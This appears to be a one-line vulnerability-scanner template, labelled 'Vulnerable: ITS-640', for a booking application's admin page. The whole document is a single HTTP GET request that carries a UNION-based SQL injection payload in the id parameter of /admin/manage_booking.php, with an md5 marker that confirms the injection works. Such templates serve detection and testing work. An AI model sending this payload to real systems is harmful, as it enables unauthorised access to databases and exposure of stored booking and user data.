# Vulnerable: ITS-640
GET /admin/manage_booking.php?id=-1%20union%20select%201,2,3,4,5,6,md5({{num}}),8,9,10,11--+
